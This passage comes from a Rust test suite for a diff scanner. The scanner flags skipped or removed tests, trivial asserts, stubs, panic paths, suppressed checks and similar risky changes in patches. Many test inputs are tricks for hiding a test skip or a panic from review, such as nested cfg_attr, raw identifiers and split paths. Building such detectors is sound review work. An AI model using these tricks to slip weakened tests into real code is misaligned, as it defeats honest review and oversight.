        for (before, after) in [
            ("all(miri),", "all(),"),
            ("not(any()),", "not(miri),"),
            ("target_os = \"plan9\",", "target_os = \"linux\","),
            ("feature = \"never-enabled\",", "feature = \"default\","),
            ("any(miri),", "any(miri, unix, windows),"),
        ] {
            let (removed, added) = (format!("-    {before}"), format!("+    {after}"));
            let condition = found(&hunk_of(
                "tests/slow.rs",
                &[
                    " #[test]",
                    " #[cfg_attr(",
                    &removed,
                    &added,
                    "     ignore",
                    " )]",
                    " fn slow() {",
                ],
            ));
            assert_eq!(
                condition,
                [(S::TestSkipped, Basis::SyntaxFragment, 4)],
                "{before} to {after}"
            );
        }
        // The controls. Only the spacing changed: the same attribute, and no evidence.
        for (before, after) in [
            ("-    all(miri),", "+    all( miri ) ,"),
            ("-    all(miri),", "+        all(miri),"),
        ] {
            let spacing = found(&hunk_of(
                "tests/slow.rs",
                &[
                    " #[test]",
                    " #[cfg_attr(",
                    before,
                    after,
                    "     ignore",
                    " )]",
                    " fn slow() {",
                ],
            ));
            assert_eq!(spacing, [], "{before} to {after}");
        }
        // A line added beside the attribute and not in it: no evidence.
        let beside = found(&hunk_of(
            "tests/slow.rs",
            &[
                " #[test]",
                " #[cfg_attr(",
                "     all(miri),",
                "     ignore",
                " )]",
                "+#[inline]",
                " fn slow() {",
            ],
        ));
        assert_eq!(beside, []);
        // Only the reason changed. The text of the attribute is another text, so this is
        // reported too: it was not before 2026-11-14, when the words were compared. It is the
        // price of comparing the whole attribute, and it errs toward evidence.
        let reason = found(&hunk_of(
            "tests/slow.rs",
            &[
                " #[test]",
                " #[cfg_attr(",
                "     miri,",
                "-    ignore = \"slow\"",
                "+    ignore = \"very slow\"",
                " )]",
                " fn slow() {",
            ],
        ));
        assert_eq!(reason, [(S::TestSkipped, Basis::SyntaxFragment, 5)]);
    }

    /// Found 2026-11-14 while the rule was taught nested lists; the cost was older. Each
    /// `cfg_attr` list of a line was read from its own start, so lists opened inside one
    /// another cost the square of the line: 80,000 of `#[cfg_attr(` (880 KB) took 32 s to
    /// rank. The lists of a line now have an allowance between them, a count and no clock,
    /// and a line past it is taken to hold a skip. With the allowance removed this test's
    /// first line reads over two hundred thousand million bytes and gives `false`.
    #[test]
    fn the_cfg_attr_lists_of_a_line_have_an_allowance() {
        let opened = within_deadline(|| ignore_rust(&"#[cfg_attr(".repeat(200_000)));
        assert!(opened, "a line past its allowance is taken to hold a skip");
        // the same flood in a patch: one item, on its line
        let flood = format!("+{}", "#[cfg_attr(".repeat(50_000));
        assert_eq!(
            within_deadline(move || found(&hunk_of("tests/a.rs", &[&flood]))),
            [(S::TestSkipped, Basis::Lexical, 2)]
        );
        // inside the allowance the answer is exact: a deep nest that applies nothing, lists
        // side by side, and one skip at the end of them
        assert!(!ignore_rust(&"#[cfg_attr(".repeat(CFG_ATTR_READS)));
        let beside = "#[cfg_attr(a, inline)] ".repeat(10_000);
        assert!(!ignore_rust(&beside));
        assert!(ignore_rust(&format!("{beside}#[cfg_attr(a, ignore)]")));
    }

    /// Independent review, IR-L-2 and IR-L-3: an `ignore` that belongs to another attribute is
    /// no skipped test, with or without the parser; a function passed by name is a panic path;
    /// and `allow` is read whatever its spacing.
    #[test]
    fn nested_ignore_passed_functions_and_spaced_allow() {
        let pad = "a".repeat(70_000);
        let serde = "#[cfg_attr(feature = \"serde\", serde(skip, ignore, default))]";
        assert_eq!(
            found(&hunk_of("src/a.rs", &[&format!("+{serde}"), "+struct A;"])),
            []
        );
        // past the fragment budget only the token rule reads it: the same answer (and the mark)
        assert_eq!(
            found(&hunk_of("src/a.rs", &[&format!("+{serde} // {pad}")])),
            [(S::SyntaxUnchecked, Basis::Lexical, 2)]
        );
        for (text, skips) in [
            ("miri, ignore)]", true),
            ("miri, ignore = \"slow\")]", true),
            ("all(a, b), allow(x), ignore)]", true),
            ("miri, ignore", true),
            ("ignore, allow(x))]", false),
            ("miri, allow(ignore))]", false),
            ("feature = \"serde\", serde(skip, ignore, default))]", false),
            ("miri, ignored)]", false),
            ("miri)]", false),
            // second independent review, IR2-M-2: a `cfg_attr` that a `cfg_attr` applies is
            // followed (before, each of the first six was false)
            ("all(), cfg_attr(all(), ignore))]", true),
            ("all(), cfg_attr ( all() , ignore = \"slow\" ) )]", true),
            ("a, allow(x), cfg_attr(b, inline, ignore))]", true),
            ("a, cfg_attr(b, cfg_attr(c, ignore)))]", true),
            ("a, cfg_attr(b, cfg_attr(c, inline)), ignore)]", true),
            ("a, cfg_attr(b, ignore", true),
            // and only that: the nested condition, the place of the condition, another
            // attribute's list, a longer name, and what follows a nested list that has closed
            ("all(), cfg_attr(ignore, allow(x)))]", false),
            ("cfg_attr(a, ignore), allow(x))]", false),
            ("a, serde(cfg_attr(b, ignore)))]", false),
            ("a, my_cfg_attr(b, ignore))]", false),
            ("a, cfg_attr(b, inline) ignore)]", false),
            (
                "a, cfg_attr(b, cfg_attr(c, inline)))] fn ignore() {}",
                false,
            ),
        ] {
            assert_eq!(cfg_attr_skips(text.as_bytes()).0, skips, "{text}");
        }
        // one pass and no recursion: a line that nests as deep as it is long, and the cost
        // is the bytes read: all of an open list, and a closed one up to its end
        let deep = format!("a, {}ignore", "cfg_attr(a, ".repeat(200_000));
        assert_eq!(cfg_attr_skips(deep.as_bytes()), (true, deep.len()));
        let deep = format!(
            "a, {}inline{}",
            "cfg_attr(a, ".repeat(200_000),
            ")".repeat(200_001)
        );
        assert_eq!(cfg_attr_skips(deep.as_bytes()), (false, deep.len()));
        assert_eq!(cfg_attr_skips(b"miri, ignore)] fn a() {}"), (true, 13));
        assert_eq!(cfg_attr_skips(b"miri)] fn a() {}"), (false, 5));
        // (since review V3 round 9 the parser names a path call and a path value itself, so
        // these carry its basis; past its budget the token rule finds the same five)
        for line in [
            "+    it.map(Result::unwrap)",
            "+    it.map(Option::expect)",
            "+    let c = <Option<u32>>::unwrap(x);",
            "+    let d = Result::<u32, E>::unwrap(r);",
            "+    let e = Wrapper :: expect (x, \"one\");",
        ] {
            assert_eq!(
                found(&hunk_of("src/a.rs", &[line])),
                [(S::PanicPathAdded, Basis::SyntaxFragment, 2)],
                "{line}"
            );
            assert_eq!(
                found(&hunk_of("src/a.rs", &[&format!("{line} // {pad}")])),
                [
                    (S::PanicPathAdded, Basis::Lexical, 2),
                    (S::SyntaxUnchecked, Basis::Lexical, 2)
                ],
                "{line}"
            );
        }
        assert_eq!(
            found(&hunk_of(
                "src/a.rs",
                &["+    it.map(Result::unwrap_or_default)"]
            )),
            []
        );
        for line in [
            "+#![allow(unused)]",
            "+#! [allow(unused)]",
            "+# [allow(unused)]",
            "+#[allow(dead_code)]",
        ] {
            assert_eq!(
                found(&hunk_of("src/a.rs", &[line]))
                    .iter()
                    .map(|item| item.0)
                    .collect::<Vec<_>>(),
                [S::CheckSuppressed],
                "{line}"
            );
        }
    }

    /// Review V3 round 8, VD3R8-M-1: `r#unwrap` is the identifier `unwrap` to the compiler
    /// (checked there with rustc), and `x.r#unwrap()` and `X::r#unwrap(x)` left neither an item
    /// nor a mark. A raw identifier is read as the identifier it is, by the parser and by the
    /// token rules, with the parser and without it.
    #[test]
    fn a_raw_identifier_is_read_as_the_identifier_it_is() {
        let pad = "a".repeat(70_000);
        let cases: &[(&str, EvidenceSignal)] = &[
            ("pub fn f(x: X) { x.r#unwrap(); }", S::PanicPathAdded),
            ("pub fn g(x: X) { X::r#unwrap(x); }", S::PanicPathAdded),
            ("pub fn h(x: X) { x.r#expect(\"one\"); }", S::PanicPathAdded),
            ("pub fn i(x: X) { x . r#unwrap (); }", S::PanicPathAdded),
            (
                "pub fn j(it: I) { it.map(Result::r#unwrap); }",
                S::PanicPathAdded,
            ),
            (
                "pub fn k(it: I) { it.map(r#Option :: r#expect); }",
                S::PanicPathAdded,
            ),
            ("fn l() { r#assert!(true); }", S::TrivialAssert),
            ("fn m() { r#todo!(); }", S::StubAdded),
            ("fn n() { r#unimplemented!(); }", S::StubAdded),
            ("#[r#ignore]", S::TestSkipped),
            ("#[r#cfg_attr(miri, r#ignore)]", S::TestSkipped),
            ("#[r#allow(dead_code)]", S::CheckSuppressed),
        ];
        for (line, signal) in cases {
            // the parser reads the hunk
            let parsed: Vec<EvidenceSignal> = found(&hunk_of("tests/r.rs", &[&format!("+{line}")]))
                .iter()
                .map(|item| item.0)
                .collect();
            assert_eq!(parsed, [*signal], "{line}");
            // past the fragment budget only the token rules read it, and the hunk says so
            let unparsed: Vec<EvidenceSignal> =
                found(&hunk_of("tests/r.rs", &[&format!("+{line} // {pad}")]))
                    .iter()
                    .map(|item| item.0)
                    .collect();
            assert!(unparsed.contains(signal), "{line}: {unparsed:?}");
        }
        // not raw identifiers: the opener of a raw string; and a longer name is another name
        for line in [
            "+let a = r#\"x.unwrap()\"#;",
            "+let b = br#\"todo!()\"#;",
            "+let d = x.r#unwrap_or(1);",
            "+let e = it.map(Result::r#unwrap_or_default);",
        ] {
            assert_eq!(found(&hunk_of("src/r.rs", &[line])), [], "{line}");
        }
        assert_eq!(without_raw_prefixes("x.unwrap()"), None);
        assert_eq!(
            without_raw_prefixes("x.r#unwrap(r#\"s\"#, r#fn)").as_deref(),
            Some("x.  unwrap(r#\"s\"#,   fn)")
        );
    }

    /// Review V3 round 9, VD3R9-M-1. A function named by a path is a panic path like the
    /// method call it is: `X::unwrap(x)`, `<Option<u32>>::expect(x, "…")`, and the path passed
    /// as a value, `it.map(X::unwrap)`. Only a token rule read these, on one line, so a path
    /// broken after its `::` (which compiles to the same call) left neither an item nor a
    /// mark; with the raw spelling `r#unwrap` this was Vesper's file. The parser names them
    /// now, on the line of the name.
    #[test]
    fn a_path_call_and_a_path_value_are_panic_paths_over_any_number_of_lines() {
        let vesper = new_file(
            "src/raw.rs",
            &[
                "pub struct X;",
                "impl X { pub fn unwrap(self) {} }",
                "pub fn method(x: X) {",
                "    x.",
                "        r#unwrap();",
                "}",
                "pub fn path(x: X) {",
                "    X::",
                "        r#unwrap(x);",
                "}",
                "pub fn passed(it: impl Iterator<Item = X>) {",
                "    let _ = it.map(X::",
                "        r#unwrap);",
                "}",
                "pub fn standard(it: impl Iterator<Item = Result<u8, ()>>) {",
                "    let _ = it.map(Result::",
                "        r#unwrap);",
                "}",
            ],
        );
        // before: line 5 alone
        assert_eq!(
            found(&vesper),
            [
                (S::PanicPathAdded, Basis::SyntaxFragment, 5),
                (S::PanicPathAdded, Basis::SyntaxFragment, 9),
                (S::PanicPathAdded, Basis::SyntaxFragment, 13),
                (S::PanicPathAdded, Basis::SyntaxFragment, 17),
            ]
        );
        let cases: &[(&[&str], u32)] = &[
            (&["+    let v = X::unwrap(x);"], 2),
            (&["+    let v = X::", "+        unwrap(x);"], 3),
            (
                &[
                    "+    let v = <Option<u32>>::",
                    "+        expect(x, \"one\");",
                ],
                3,
            ),
            (
                &["+    let v = Result::<u32, E>::", "+        unwrap(r);"],
                3,
            ),
            (&["+    let v = a::b::", "+        unwrap::<u8>(x);"], 3),
            // passed as a value: a type of the patch's own, the standard one over two lines,
            // and with generic arguments (second independent review, IR2-M-2: no evidence)
            (&["+    let v = it.map(X::unwrap);"], 2),
            (&["+    let v = it.map(Option::", "+        expect);"], 3),
            (&["+    let f = Option::<u32>::unwrap;"], 2),
            // IR2-M-2: after `/* /* */ // */` the lexer's code view takes the rest of the line
            // for a comment, so no token rule sees the call. The parser nests comments as
            // the compiler does and names it; the function form was not a construct before.
            (&["+    /* /* */ // */ let v = Result::unwrap(x);"], 2),
            (&["+    /* /* */ // */ let v = x.unwrap();"], 2),
        ];
        for (body, line) in cases {
            assert_eq!(
                found(&hunk_of("src/p.rs", body)),
                [(S::PanicPathAdded, Basis::SyntaxFragment, *line)],
                "{body:?}"
            );
        }
        // not panic paths: an import, a longer name, a path that only leads on, a macro of
        // that name, a type, a definition
        for body in [
            &["+use a::expect;", "+use b::{c, unwrap};"][..],
            &["+    let v = X::unwrap_or(x, 1);"][..],
            &["+    let v = a::unwrap::b(x);"][..],
            &["+    X::unwrap!(x);"][..],
            &["+fn f(a: a::unwrap) {}"][..],
            &["+impl X { fn unwrap(self) {} }"][..],
        ] {
            assert_eq!(found(&hunk_of("src/p.rs", body)), [], "{body:?}");
        }
        // Inside another macro's body the parser names nothing. On one line the token rule
        // reads a call by any path; a path broken over two lines, and a function of the
        // patch's own type passed as a value, are words nothing read, and the line says so.
        let inside = |lines: &[&str]| {
            let mut body = vec![" // ctx", "+outer! {"];
            body.extend_from_slice(lines);
            body.extend_from_slice(&["+}", " // ctx"]);
            found(&hunk_of("src/x.rs", &body))
                .iter()
                .map(|item| (item.0, item.1))
                .collect::<Vec<_>>()
        };
        assert_eq!(
            inside(&["+    let v = X::unwrap(x);"]),
            [(S::PanicPathAdded, Basis::Lexical)]
        );
        assert_eq!(
            inside(&["+    let v = X::", "+        unwrap(x);"]),
            [(S::SyntaxUnchecked, Basis::Lexical)]
        );
        assert_eq!(
            inside(&["+    let v = it.map(X::unwrap);"]),
            [(S::SyntaxUnchecked, Basis::Lexical)]
        );
    }

    /// Review V3 round 9, VD3R9-M-1: a removed `#[r#test]` is a removed test. The rule was
    /// three exact tokens, and the code view blanks a raw prefix to two spaces, so
    /// `#[  test]` matched none of them. The rule reads the same three attributes whatever
    /// their spacing.
    #[test]
    fn a_removed_test_attribute_is_read_whatever_its_spelling() {
        for line in [
            "#[test]",
            "#[r#test]",
            "# [ test ]",
            "#[tokio::test]",
            "#[r#tokio::r#test]",
            "#[ tokio :: test ]",
            "#[rstest]",
            "#[r#rstest]",
            "    #[test] // was slow",
        ] {
            let found: Vec<(EvidenceSignal, Side, u32)> =
                file_evidence(&removed("tests/x.rs", &[line, "fn t() {}"]))
                    .iter()
                    .map(|e| (e.signal, e.side, e.line))
                    .collect();
            assert_eq!(found, [(S::TestRemoved, Side::Old, 2)], "{line}");
            // adding one is not evidence of anything
            assert_eq!(signals(&added("tests/x.rs", &[line])), [], "{line}");
        }
        for line in [
            "#[testing]",
            "#[test_case(1)]",
            "#[cfg(test)]",
            "#![test]",
            "// #[test]",
            "let s = \"#[test]\";",
            "let a = x#[test];",
        ] {
            assert_eq!(signals(&removed("tests/x.rs", &[line])), [], "{line}");
        }
        // Vesper's second file
        let file = parse(
            "diff --git a/tests/raw_removed.rs b/tests/raw_removed.rs\n--- a/tests/raw_removed.rs\n+++ b/tests/raw_removed.rs\n@@ -1,3 +1,2 @@\n-#[r#test]\n fn check() {}\n fn stays() {}\n",
        )
        .unwrap()
        .remove(0);
        let items: Vec<(EvidenceSignal, Side, u32)> = file_evidence(&file)
            .iter()
            .map(|e| (e.signal, e.side, e.line))
            .collect();
        assert_eq!(items, [(S::TestRemoved, Side::Old, 1)]);
    }

    /// Second independent review, IR2-M-2: the rows of its table. Each compiles and behaves
    /// as its plain spelling does, and each left neither an item nor `syntax_unchecked`. One
    /// row is not here because it is still so: a call inside another macro's body after
    /// `/* /* */ // */` (the corpus declares it a known miss; the lexer's code view does not
    /// nest block comments, and inside a macro's body nothing else reads).
    #[test]
    fn every_other_row_of_the_second_reviews_table_is_an_item() {
        let rows: &[(&[&str], EvidenceSignal, u32)] = &[
            (&["+    let v = x.r#unwrap();"], S::PanicPathAdded, 11),
            (
                &["+    let v = x.r#expect(\"set\");"],
                S::PanicPathAdded,
                11,
            ),
            (
                &["+    let v = it.map(Option::r#unwrap);"],
                S::PanicPathAdded,
                11,
            ),
            (&["+    #[r#ignore]", "+    fn t() {}"], S::TestSkipped, 11),
            (
                &["+    let f = Option::<u32>::unwrap;"],
                S::PanicPathAdded,
                11,
            ),
            (
                &[
                    "+    #[cfg_attr(all(), cfg_attr(all(), ignore))]",
                    "+    fn t() {}",
                ],
                S::TestSkipped,
                11,
            ),
            (
                &["+    /* /* */ // */ let v = Result::unwrap(x);"],
                S::PanicPathAdded,
                11,
            ),
        ];
        for (lines, signal, line) in rows {
            // the review's shape: a hunk at line 10 of an existing file, a comment line
            // before and after
            let mut text = format!(
                "--- a/src/x.rs\n+++ b/src/x.rs\n@@ -10,2 +10,{} @@\n // ctx\n",
                lines.len() + 2
            );
            for line in *lines {
                text.push_str(line);
                text.push('\n');
            }
            text.push_str(" // ctx\n");
            let file = parse(&text).unwrap().remove(0);
            assert_eq!(
                found(&file),
                [(*signal, Basis::SyntaxFragment, *line)],
                "{lines:?}"
            );
        }
        // the nested conditional skip past the parser's budget: the token rule follows the
        // nested `cfg_attr` too, and only that
        let pad = "a".repeat(70_000);
        assert_eq!(
            found(&hunk_of(
                "tests/a.rs",
                &[&format!(
                    "+#[cfg_attr(all(), cfg_attr(all(), ignore))] // {pad}"
                )]
            )),
            [
                (S::TestSkipped, Basis::Lexical, 2),
                (S::SyntaxUnchecked, Basis::Lexical, 2)
            ]
        );
        for line in [
            "+#[cfg_attr(all(), cfg_attr(ignore, allow(x)))]",
            "+#[cfg_attr(all(), serde(cfg_attr(all(), ignore)))]",
        ] {
            assert_eq!(
                found(&hunk_of("tests/a.rs", &[line, "+struct A;"])),
                [],
                "{line}"
            );
            assert_eq!(
                found(&hunk_of("tests/a.rs", &[&format!("{line} // {pad}")])),
                [(S::SyntaxUnchecked, Basis::Lexical, 2)],
                "{line}"
            );
        }
    }

    /// Review V3 round 4, VD3R4-M-1: inside another macro's body the parser names no
    /// construct, and a rule that reads one line cannot follow an assertion over three. The
    /// line that opens it says that it was not checked. Before, there was nothing.
    #[test]
    fn a_construct_opened_inside_a_macro_body_and_closed_on_another_line_is_unchecked() {
        type Item = (EvidenceSignal, Basis, u32);
        let forwarded = found(&new_file(
            "tests/m.rs",
            &[
                "macro_rules! outer {",
                "    ($($tt:tt)*) => { $($tt)* };",
                "}",
                "outer! {",
                "    assert!(",
                "        true",
                "    );",
                "}",
            ],
        ));
        assert_eq!(forwarded, [(S::SyntaxUnchecked, Basis::Lexical, 5)]);
        // Review V3 round 5, VD3R5-M-1: the outer macro on the same row is not the assertion,
        // and does not account for it.
        // The mark is on the line that holds the unread word: `assert`, or the `ignore` of a
        // conditional skip.
        for (body, line) in [
            (&["outer! { assert!(", "    true", "); }"][..], 1),
            (
                &[
                    "outer! { #[cfg_attr(",
                    "    miri,",
                    "    ignore",
                    ")] fn a() {} }",
                ][..],
                3,
            ),
            (&["a!(); outer! { std::assert!(", "    true", "); }"][..], 1),
        ] {
            assert_eq!(
                found(&new_file("tests/m.rs", body)),
                [(S::SyntaxUnchecked, Basis::Lexical, line)],
                "{body:?}"
            );
        }
        let attribute = found(&new_file(
            "tests/m.rs",
            &[
                "outer! {",
                "    #[cfg_attr(",
                "        miri,",
                "        ignore",
                "    )]",
                "    #[test]",
                "    fn a() {}",
                "}",
            ],
        ));
        assert_eq!(attribute, [(S::SyntaxUnchecked, Basis::Lexical, 4)]);
        // On one line the token rules read it, and there is nothing unchecked. So too for an
        // assertion over several lines that the parser reads itself, and for one that is not
        // an assertion at all.
        let cases: &[(&[&str], &[Item])] = &[
            (
                &["outer! {", "    assert!(true);", "}"],
                &[(S::TrivialAssert, Basis::Lexical, 2)],
            ),
            (
                &["fn a() {", "    assert!(", "        true", "    );", "}"],
                &[(S::TrivialAssert, Basis::SyntaxFragment, 2)],
            ),
            (
                &["fn a() {", "    assert!(", "        b()", "    );", "}"],
                &[],
            ),
            (
                &["outer! {", "    my_assert!(", "        true", "    );", "}"],
                &[],
            ),
            (
                &[
                    "outer! {",
                    "    assert!(b(), \"{}\", c(",
                    "        d",
                    "    ));",
                    "}",
                ],
                &[(S::SyntaxUnchecked, Basis::Lexical, 2)],
            ),
        ];
        for (body, expected) in cases {
            assert_eq!(found(&new_file("tests/m.rs", body)), *expected, "{body:?}");
        }
        assert_eq!(unmatched_parentheses("a(b(c) d( e"), [1, 8]);
        assert_eq!(unmatched_parentheses(") a (b)"), []);
        assert_eq!(
            identifiers_in("x.unwrap_or(1); r#assert!(a2b, 12ab) _t").collect::<Vec<_>>(),
            [
                (0, "x"),
                (2, "unwrap_or"),
                (16, "r"),
                (18, "assert"),
                (26, "a2b"),
                (37, "_t")
            ]
        );
        assert_eq!(code_extent("    a  b   "), Some((4, 8)));
        assert_eq!(code_extent("   "), None);
    }

    /// In a new file a panic path stands whatever attribute is above it. (These were the
    /// cases that fell short of the proof of test code, while there was one.)
    #[test]
    fn a_panic_path_in_a_new_file_stands_whatever_attribute_is_above_it() {
        let stands: &[(&[&str], u32)] = &[
            (&["#[test]", "fn a() {", "    f().unwrap();", "}"], 3),
            (
                &[
                    "#[tokio::test]",
                    "async fn a() {",
                    "    f().await.expect(\"x\");",
                    "}",
                ],
                3,
            ),
            // Vesper's reproductions: an attribute imported under a test framework's name, a
            // dependency renamed to a test framework's, and the same done to `test` itself
            (
                &[
                    "use tracing::instrument as rstest;",
                    "#[rstest]",
                    "pub fn production() {",
                    "    load().unwrap();",
                    "}",
                ],
                4,
            ),
            (
                &[
                    "use some_macros::passthrough as test;",
                    "#[test]",
                    "pub fn production() {",
                    "    load().unwrap();",
                    "}",
                ],
                4,
            ),
            // an attribute macro before the cfg, or around the item, may drop the cfg
            (
                &[
                    "#[strip]",
                    "#[cfg(test)]",
                    "pub fn production() {",
                    "    load().unwrap();",
                    "}",
                ],
                4,
            ),
            (
                &[
                    "#[strip]",
                    "mod outer {",
                    "    #[cfg(test)]",
                    "    pub fn production() {",
                    "        load().unwrap();",
                    "    }",
                    "}",
                ],
                5,
            ),
            // the function after the one under `cfg(test)` is not under it
            (
                &[
                    "#[cfg(test)]",
                    "fn helper() {}",
                    "fn real() {",
                    "    f().unwrap();",
                    "}",
                ],
                4,
            ),
        ];
        for (body, line) in stands {
            assert_eq!(
                found(&new_file("src/a.rs", body)),
                [(S::PanicPathAdded, Basis::SyntaxFragment, *line)],
                "{body:?}"
            );
        }
    }

    /// A hunk from the middle of a file proves nothing, whatever it shows: above it a comment
    /// can be open that ends on the attribute's own line, and then this function is in the
    /// program. Its panic path stands.
    #[test]
    fn a_hunk_from_the_middle_of_a_file_keeps_its_panic_path() {
        let middle = parse(
            "--- a/src/a.rs\n+++ b/src/a.rs\n@@ -40,4 +40,5 @@\n  notes\n #[cfg(test)] // */\n pub fn production() {\n+    load().unwrap();\n }\n",
        )
        .unwrap()
        .remove(0);
        assert_eq!(
            found(&middle),
            [(S::PanicPathAdded, Basis::SyntaxFragment, 43)]
        );
        for body in [
            &[
                " #[cfg(test)]",
                " mod checks {",
                "+    fn helper() { f().unwrap(); }",
                " }",
            ][..],
            &[
                "+#[cfg(test)]",
                "+fn helper() {",
                "+    f().unwrap();",
                "+}",
            ][..],
        ] {
            let items = found(&hunk_of("src/a.rs", body));
            assert_eq!(
                items.iter().map(|i| (i.0, i.1)).collect::<Vec<_>>(),
                [(S::PanicPathAdded, Basis::SyntaxFragment)],
                "{body:?}"
            );
        }
        let unseen = found(&hunk_of("tests/a.rs", &["+    f().unwrap();"]));
        assert_eq!(unseen, [(S::PanicPathAdded, Basis::SyntaxFragment, 2)]);
    }

    /// Where the parser cannot read, the lower rung's answer stands with its own basis; where
    /// neither finds anything there is nothing.
    #[test]
    fn what_the_parser_cannot_read_keeps_the_lower_rungs_answer() {
        // inside a macro's body the parser reads nothing
        assert_eq!(
            found(&hunk_of("src/a.rs", &["+    outer! { x.unwrap(); }"])),
            [(S::PanicPathAdded, Basis::Lexical, 2)]
        );
        // a hunk over the fragment budget is not parsed at all, and says so
        let long = format!("+    f().unwrap(); // {}", "a".repeat(70_000));
        assert_eq!(
            found(&hunk_of("src/a.rs", &[long.as_str()])),
            [
                (S::PanicPathAdded, Basis::Lexical, 2),
                (S::SyntaxUnchecked, Basis::Lexical, 2)
            ]
        );
        for line in [
            "+    x.unwrap_or(1);",
            "+    x.expect_err(\"e\");",
            "+    let s = \"a.unwrap()\"; // b.unwrap()",
            "+    unwrap(x);",
            "-    f().unwrap();",
        ] {
            assert_eq!(found(&hunk_of("src/a.rs", &[line])), [], "{line}");
        }
        // another language has no grammar here and no such rule
        assert_eq!(found(&hunk_of("a.py", &["+x.unwrap()"])), []);
    }

    /// The parse changes nothing it has no construct for: the same items, in the same order.
    #[test]
    fn items_the_parser_has_no_view_on_keep_their_place() {
        let file = hunk_of(
            "src/a.rs",
            &[
                "+    let c = std::process::Command::new(\"x\");",
                "+    let v = unsafe { f() }.unwrap();",
                "+    todo!()",
            ],
        );
        assert_eq!(
            found(&file),
            [
                (S::ProcessSpawn, Basis::Lexical, 2),
                (S::UnsafeAdded, Basis::Lexical, 3),
                (S::PanicPathAdded, Basis::SyntaxFragment, 3),
                (S::StubAdded, Basis::SyntaxFragment, 4),
            ]
        );
    }

    /// These are read on added lines only: removing a skip or a stub is the repair.
    #[test]
    fn removing_a_skip_a_trivial_assert_or_a_stub_is_not_evidence() {
        for (path, line) in [
            ("tests/a.rs", "#[ignore]"),
            ("tests/a.rs", "    assert!(true);"),
            ("src/a.rs", "    todo!()"),
            ("test_a.py", "@pytest.mark.skip"),
            ("a.py", "    raise NotImplementedError"),
        ] {
            assert_eq!(signals(&removed(path, &[line])), [], "{path}: {line}");
        }
    }

    #[test]
    fn labels_and_weights_are_the_documented_table() {
        let table: Vec<(&str, u32)> = EvidenceSignal::ALL
            .iter()
            .map(|s| (s.label(), s.weight()))
            .collect();
        assert_eq!(
            table,
            [
                ("unsafe_added", 4),
                ("process_spawn", 4),
                ("network_fetch", 3),
                ("dynamic_eval", 4),
                ("ci_privilege", 4),
                ("build_hook", 3),
                ("secret_like", 5),
                ("check_suppressed", 2),
                ("test_removed", 3),
                ("test_skipped", 3),
                ("trivial_assert", 3),
                ("stub_added", 3),
                ("error_swallowed", 3),
                ("panic_path_added", 3),
                ("syntax_unchecked", 1),
            ]
        );
        assert_eq!((Side::New.label(), Side::Old.label()), ("new", "old"));
        assert_eq!(EVIDENCE_BASIS, "lexical");
        assert_eq!(MAX_EVIDENCE_PER_FILE, 32);
    }

    #[test]
    fn hunk_signals_agree_with_file_evidence() {
        let patch = "--- a/src/x.rs\n+++ b/src/x.rs\n@@ -1,1 +1,2 @@\n a\n+unsafe { f() }\n@@ -10,1 +11,3 @@\n b\n+#[allow(x)]\n+let c = std::process::Command::new(\"x\");\n";
        let file = parse(patch).unwrap().remove(0);
        let per_hunk: Vec<Vec<EvidenceSignal>> = file
            .patch_twin
            .hunks
            .iter()
            .map(|h| hunk_signals(&file, h))
            .collect();
        assert_eq!(
            per_hunk,
            [
                vec![S::UnsafeAdded],
                vec![S::ProcessSpawn, S::CheckSuppressed]
            ]
        );
        for (hunk, signals) in file.patch_twin.hunks.iter().zip(&per_hunk) {
            let mut from_file: Vec<EvidenceSignal> = file_evidence(&file)
                .into_iter()
                .filter(|e| e.hunk == hunk.id)
                .map(|e| e.signal)
                .collect();
            from_file.sort();
            from_file.dedup();
            assert_eq!(&from_file, signals);
        }
    }

    #[test]
    fn a_prefix_token_needs_only_a_boundary_before() {
        assert!(token_in("def test_x():", "def test*"));
        assert!(token_in("os.execvp(a)", "os.exec*"));
        assert!(!token_in("pos.execvp(a)", "os.exec*"));
        assert!(!token_in("xdef test_x", "def test*"));
        // The byte before a prefix token, away from the start of the line.
        assert!(token_in("x = os.execvp(a)", "os.exec*"));
        assert!(token_in("f(os.execvp(a))", "os.exec*"));
        assert!(!token_in("x = a.os.execvp(a)", "os.exec*"));
        assert!(!token_in("x = $os.execvp(a)", "os.exec*"));
        assert!(!token_in("x = _os.execvp(a)", "os.exec*"));
        assert!(token_in("a unsafe b", "unsafe"));
    }
    /// Review V3 round 1, VD3-H-1: an attribute that only mentions `test` proves no test, so the
    /// panic path under it stands. Before, `#[cfg_attr(any(), test)]` on a production function
    /// made the item disappear.
    #[test]
    fn a_false_test_context_does_not_withdraw_a_panic_path() {
        let stands: &[&[&str]] = &[
            &[
                "+#[cfg_attr(any(), test)]",
                "+pub fn production() {",
                "+    load().unwrap();",
                "+}",
            ],
            &[
                "+#[cfg_attr(feature = \"x\", test)]",
                "+pub fn production() {",
                "+    load().unwrap();",
                "+}",
            ],
            // review V3 round 2, VD3R2-H-1: an unknown path that ends in `test`
            &[
                "+#[my_framework::test]",
                "+pub fn production() {",
                "+    load().unwrap();",
                "+}",
            ],
            &[
                "+#[my_attribute(test)]",
                "+pub fn production() {",
                "+    load().unwrap();",
                "+}",
            ],
            &[
                "+#[cfg(not(test))]",
                "+mod real {",
                "+    pub fn production() {",
                "+        load().unwrap();",
                "+    }",
                "+}",
            ],
            &[
                "+mod tests {",
                "+    pub fn production() {",
                "+        load().unwrap();",
                "+    }",
                "+}",
            ],
        ];
        for body in stands {
            let items = found(&hunk_of("src/a.rs", body));
            assert_eq!(
                items.iter().map(|i| (i.0, i.1)).collect::<Vec<_>>(),
                [(S::PanicPathAdded, Basis::SyntaxFragment)],
                "{body:?}"
            );
        }
        // and so does one under a real `#[cfg(test)]` in a new file: nothing is withdrawn
        let real = found(&new_file(
            "src/a.rs",
            &["#[cfg(test)]", "fn a() {", "    load().unwrap();", "}"],
        ));
        assert_eq!(real, [(S::PanicPathAdded, Basis::SyntaxFragment, 3)]);
    }

    /// Review V3 round 1, VD3-M-1: a change inside a construct that started on an unchanged
    /// line is a change to the construct, reported on the added line.
    #[test]
    fn an_added_line_inside_a_construct_that_spans_lines_is_evidence() {
        let assertion = found(&hunk_of(
            "tests/m.rs",
            &[
                " fn checks() {",
                "     assert!(",
                "-        computes_answer()",
                "+        true",
                "     );",
            ],
        ));
        assert_eq!(assertion, [(S::TrivialAssert, Basis::SyntaxFragment, 4)]);
        // Review V3 round 2, VD3R2-M-1: a construct that was already what it is now is not
        // added by a change to its message. Before, these three were reported.
        for (path, body) in [
            (
                "src/m.rs",
                &[" fn f() {", "     todo!(", "+        \"later\"", "     )"][..],
            ),
            (
                "src/m.rs",
                &[
                    " fn later() {",
                    "     todo!(",
